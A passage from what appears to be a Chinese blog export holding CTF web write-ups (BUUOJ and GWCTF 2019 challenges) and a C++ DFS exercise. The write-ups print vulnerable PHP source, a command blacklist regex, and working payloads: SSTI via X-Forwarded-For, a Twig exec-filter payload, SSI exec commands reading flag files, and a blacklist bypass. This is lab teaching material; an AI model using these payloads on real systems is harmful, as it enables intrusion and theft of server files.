ogICAgaWYgKChzdHJpbmcpJF9QT1NUWydhJ10gIT09IChzdHJpbmcpJF9QT1NUWydiJ10gJiYgbWQ1KCRfUE9TVFsnYSddKSA9PT0gbWQ1KCRfUE9TVFsnYiddKSkgewogICAgICAgIGVjaG8gYCRjbWRgOwogICAgfSBlbHNlIHsKICAgICAgICBlY2hvICgibWQ1IGlzIGZ1bm55IH4iKTsKICAgIH0KfQoKPz4KPGh0bWw+CjxzdHlsZT4KICBib2R5ewogICBiYWNrZ3JvdW5kOnVybCguL2JqLnBuZykgIG5vLXJlcGVhdCBjZW50ZXIgY2VudGVyOwogICBiYWNrZ3JvdW5kLXNpemU6Y292ZXI7CiAgIGJhY2tncm91bmQtYXR0YWNobWVudDpmaXhlZDsKICAgYmFja2dyb3VuZC1jb2xvcjojQ0NDQ0NDOwp9Cjwvc3R5bGU+Cjxib2R5Pgo8L2JvZHk+CjwvaHRtbD4=</code></p><p><strong>base64解一下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"xixi～ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>前半部分就是刚才的东西，后半部分是讲cmd得，果然是命令执行。a和b套刚刚的就行了，正则我看的头疼。。试了个dir和dir%20&#x2F;发现flag在目录下，然后试了个ca\t发现可以用。</p><p><img src="/4.jpg" alt="dir"></p><p><img src="/5.jpg" alt="ca\t"></p><h2 id="Mark-loves-cat"><a href="#Mark-loves-cat" class="headerlink" title="Mark loves cat"></a>Mark loves cat</h2><p>打开页面发现有用的信息都没得，然后fuzz一下用dirb<br><br><code>dirb http://31d76b5b-06b8-4911-9a08-b2d9d71eb368.node3.buuoj.cn/</code></p><p><img src="/6.jpg" alt="dirb"></p><p>发现.git源码泄露。<br><br><code>python GitHack.py http://31d76b5b-06b8-4911-9a08-b2d9d71eb368.node3.buuoj.cn/.git</code></p><p><img src="/7.jpg" alt=".git"></p><p>得到flag.php和index.php.</p><h3 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$flag = file_get_contents(<span class="string">'/flag'</span>);</span></span><br></pre></td></tr></table></figure><h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">"dog"</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">"cat"</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">'yds'</span>;</span><br><span class="line"></span><br><span class="line">foreach(<span class="variable">$_POST</span> as <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    $<span class="variable">$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line">foreach(<span class="variable">$_GET</span> as <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    $<span class="variable">$x</span> = $<span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line">foreach(<span class="variable">$_GET</span> as <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">'flag'</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">'flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!isset(<span class="variable">$_GET</span>[<span class="string">'flag'</span>]) &amp;&amp; !isset(<span class="variable">$_POST</span>[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || <span class="variable">$_GET</span>[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo <span class="string">"the flag is: "</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p>可以看到里面用到可变变量，第二个条件最简单，只要保证post的flag和get的flag变量没被用过就行。输出的$yds,所以我们只要get请求<code>yds=flag</code>就行了，就会把<code>$x=yds,$y=flag</code>&#x3D;&#x3D;&gt;<code>$yds=$flag</code>,然后$yds就会是flag。</p><p><img src="/8.jpg" alt="brup"></p><p><a href="https://www.php.net/manual/zh/language.variables.variable.php" target="_blank" rel="noopener">PHP可变变量</a></p><h2 id="The-Mystery-of-ip"><a href="#The-Mystery-of-ip" class="headerlink" title="The_Mystery_of_ip"></a>The_Mystery_of_ip</h2><p><img src="/9.jpg" alt="审查元素"></p><p>点进去发现三个,index.php、hint.php、flag.php。一开始没发现hint.php的提示，我这眼神，不过我看到flag.php的ip，然后试了下X-Forwarded-For、client-ip。发现ip可控，想到之前打的一题XFF注入的题，然后发现没有。看Y1ng表哥博客发现ssti注入，我傻了，第一次遇到这样也可以ssti注入的。学到了！！！</p><p><img src="/10.jpg" alt="brup"></p><p>pyload：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">X-Forwarded-For:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">&#123;&#123;system('cat</span> <span class="string">/flag')&#125;&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Cookie-is-so-stable"><a href="#Cookie-is-so-stable" class="headerlink" title="Cookie is so stable"></a>Cookie is so stable</h2><p>页面元素和上一题差不多，flag.php变成输入的，想到上一题是ssti注入，突然感觉这题可能也是注入题，然后输入了<code>49</code>,果然！</p><p><img src="/11.jpg"></p><p><img src="/12.jpg" alt="网上看到的"></p><p><a href="https://zhuanlan.zhihu.com/p/28823933" target="_blank" rel="noopener">关于ssti注入(二向箔安全学院)</a></p><p>直接拿这篇的payloadl来打：</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">"id"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>发现可以直接打。</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">"cat /flag"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/13.jpg" alt="brup"></p><p><strong>服务器会将我们输入的注入编码后变成cookie，我们直接把注入放在cookie里就行了！</strong></p><h2 id="EasySearch"><a href="#EasySearch" class="headerlink" title="EasySearch"></a>EasySearch</h2><p>打了半天没思路，看了别的表哥的wp，发现原先题目有提示vim泄露的，Buu复现好像没提示，index.php.swp拿到源码。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">ob_start();</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">get_hash</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">$chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span>;</span></span><br><span class="line"><span class="php">$random = $chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span></span><br><span class="line"><span class="php">$content = uniqid().$random;</span></span><br><span class="line"><span class="php"><span class="keyword">return</span> sha1($content); </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">    header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span></span><br><span class="line"><span class="php">***</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) <span class="keyword">and</span> $_POST[<span class="string">'username'</span>] != <span class="string">''</span> )</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        $admin = <span class="string">'6d0bc1'</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> ( $admin == substr(md5($_POST[<span class="string">'password'</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;"</span>;</span></span><br><span class="line"><span class="php">            $file_shtml = <span class="string">"public/"</span>.get_hash().<span class="string">".shtml"</span>;</span></span><br><span class="line"><span class="php">            $shtml = fopen($file_shtml, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span></span><br><span class="line">            $text = '</span><br><span class="line">            ***</span><br><span class="line">            ***</span><br><span class="line">            &lt;h1&gt;Hello,'.$_POST['username'].'&lt;/h1&gt;</span><br><span class="line">            ***</span><br><span class="line"><span class="php">***<span class="string">';</span></span></span><br><span class="line"><span class="php">            fwrite($shtml,$text);</span></span><br><span class="line"><span class="php">            fclose($shtml);</span></span><br><span class="line"><span class="php">            ***</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"[!] Header  error ..."</span>;</span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('[!] Failed')&lt;/script&gt;"</span>;</span></span><br><span class="line"><span class="php">            </span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">else</span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">***</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">***</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>可以看到要求username不为空，并且我们输入的密码MD5，前六位要与6d0bc1相等。</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">import</span> <span class="string">hashlib</span></span><br><span class="line"><span class="attr">list</span>=<span class="string">'0123456789'</span></span><br><span class="line"><span class="attr">for</span> <span class="string">a in list:</span></span><br><span class="line">    <span class="attr">for</span> <span class="string">b in list:</span></span><br><span class="line">        <span class="attr">for</span> <span class="string">c in list:</span></span><br><span class="line">            <span class="attr">for</span> <span class="string">d in list:</span></span><br><span class="line">                <span class="attr">for</span> <span class="string">e in list:</span></span><br><span class="line">                    <span class="attr">for</span> <span class="string">f in list:</span></span><br><span class="line">                        <span class="attr">for</span> <span class="string">g in list:</span></span><br><span class="line">                            <span class="attr">str1</span> = <span class="string">(a+b+c+d+e+f+g)</span></span><br><span class="line">                            <span class="attr">value</span> = <span class="string">hashlib.md5(str1.encode()).hexdigest()</span></span><br><span class="line">                            <span class="attr">if</span> <span class="string">value[0:6] == '6d0bc1':</span></span><br><span class="line">                                <span class="attr">print(str1)</span></span><br></pre></td></tr></table></figure><p>跑出 三个数字2020666、2305004、9162671。随便用一个！穿后返回了个地址</p><p><img src="/14.jpg" alt="brup"></p><p>访问一下，发现刚刚username被用了</p><p><img src="/15.jpg" alt="shtml"></p><p>省赛的时候考过ssi解析漏洞，上ssi解析漏洞:<br><br><code>&lt;!--#exec cmd=&quot;dir /&quot; --&gt;</code></p><p>访问了根目录和当前目录发现没有flag文件，然后访问了下上级目录</p><p><img src="/16.jpg"></p><p>发现flag文件，直接打，得到flag。</p><p><code>&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7-48 深入虎穴 (25分)(DFS)</title>
      <link href="/2020/02/10/7-48-%E6%B7%B1%E5%85%A5%E8%99%8E%E7%A9%B4-25%E5%88%86/"/>
      <url>/2020/02/10/7-48-%E6%B7%B1%E5%85%A5%E8%99%8E%E7%A9%B4-25%E5%88%86/</url>
      
        <content type="html"><![CDATA[<p><strong>(小声bb)怎么毛线开的题库全是算法题，砸总。每日刷题冲冲冲—-&gt;</strong></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>著名的王牌间谍 007 需要执行一次任务，获取敌方的机密情报。已知情报藏在一个地下迷宫里，迷宫只有一个入口，里面有很多条通路，每条路通向一扇门。每一扇门背后或者是一个房间，或者又有很多条路，同样是每条路通向一扇门…… 他的手里有一张表格，是其他间谍帮他收集到的情报，他们记下了每扇门的编号，以及这扇门背后的每一条通路所到达的门的编号。007 发现不存在两条路通向同一扇门。</p><p>内线告诉他，情报就藏在迷宫的最深处。但是这个迷宫太大了，他需要你的帮助 —— 请编程帮他找出距离入口最远的那扇门。</p><a id="more"></a><h2 id="输入格式："><a href="#输入格式：" class="headerlink" title="输入格式："></a>输入格式：</h2><p>输入首先在一行中给出正整数 N（n&lt;10^5），是门的数量。最后 N 行，第 i 行（1≤i≤N）按以下格式描述编号为 i 的那扇门背后能通向的门：<br><code>K D[1] D[2] ... D[K]</code><br><br>其中 K 是通道的数量，其后是每扇门的编号。</p><h2 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h2><p>在一行中输出距离入口最远的那扇门的编号。题目保证这样的结果是唯一的。</p><h2 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">13</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">2</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">5</span> <span class="number">6</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">7</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">8</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">9</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">11</span> <span class="number">10</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">13</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">12</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h2><p><code>12</code></p><h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><p>这题有DFS和BFS两种方法，不过知识换了个BFS的外壳，所以当然还是用我熟悉的DFS。第二个样例好像有0存在，我还以为我哪里有问题，卡在第二个样例，然后改成<code>sum-1</code>~~~~就过了。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,a,sum,num,root;</span><br><span class="line"><span class="keyword">int</span> Map[<span class="number">100010</span>]; </span><br><span class="line"><span class="keyword">int</span> vis[<span class="number">100010</span>];</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; p[<span class="number">100010</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> <span class="built_in">step</span>)</span></span>&#123;</span><br><span class="line">Map[x]=<span class="built_in">step</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;p[x].<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">dfs(p[x][i],<span class="built_in">step</span>+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line"><span class="built_in">memset</span>(vis,<span class="number">0</span>,<span class="keyword">sizeof</span>(vis));</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;m);</span><br><span class="line"><span class="keyword">while</span>(m--)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a);</span><br><span class="line">vis[a]=<span class="number">1</span>;       <span class="comment">//标记，没用过的就是入口</span></span><br><span class="line">p[i].push_back(a); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(vis[i]==<span class="number">0</span>)&#123;</span><br><span class="line">root=i;     <span class="comment">//找到入口</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">dfs(root,<span class="number">0</span>);</span><br><span class="line">sum=<span class="number">-1</span>;</span><br><span class="line">num=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;      <span class="comment">//求最深</span></span><br><span class="line"><span class="keyword">if</span>(Map[i]&gt;sum)&#123;</span><br><span class="line">sum=Map[i];</span><br><span class="line">num=i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>,num);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GWCTF 2019WP-复现</title>
      <link href="/2020/02/08/GWCTF-2019-WP/"/>
      <url>/2020/02/08/GWCTF-2019-WP/</url>
      
        <content type="html"><![CDATA[<p>GWCTF-2019之前比赛没做出来，我真是弟弟!</p><a id="more"></a><h2 id="枯燥的抽奖"><a href="#枯燥的抽奖" class="headerlink" title="枯燥的抽奖"></a>枯燥的抽奖</h2><p><img src="/1.jpg"><br>要求我们猜出后十位，查看网页源码，发现js指向check.php。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">8y6CBQcJaW</span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span></span><br><span class="line"><span class="php">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'seed'</span>]))&#123;</span></span><br><span class="line"><span class="php">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span></span><br><span class="line"><span class="php">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span></span><br><span class="line"><span class="php">$str=<span class="string">''</span>;</span></span><br><span class="line"><span class="php">$len1=<span class="number">20</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span></span><br><span class="line"><span class="php">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;p id='p1'&gt;"</span>.$str_show.<span class="string">"&lt;/p&gt;"</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'num'</span>]))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($_POST[<span class="string">'num'</span>]===$str)&#123;x</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">show_source(<span class="string">"check.php"</span>);</span></span><br></pre></td></tr></table></figure><p>借鉴<a href="http://wonderkun.cc/index.html/?p=585" target="_blank" rel="noopener">wonderkun</a>这位大佬写的</p><p>private key，来猜测public key</p><p>首先把他给的十位数放到这个脚本里：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1=<span 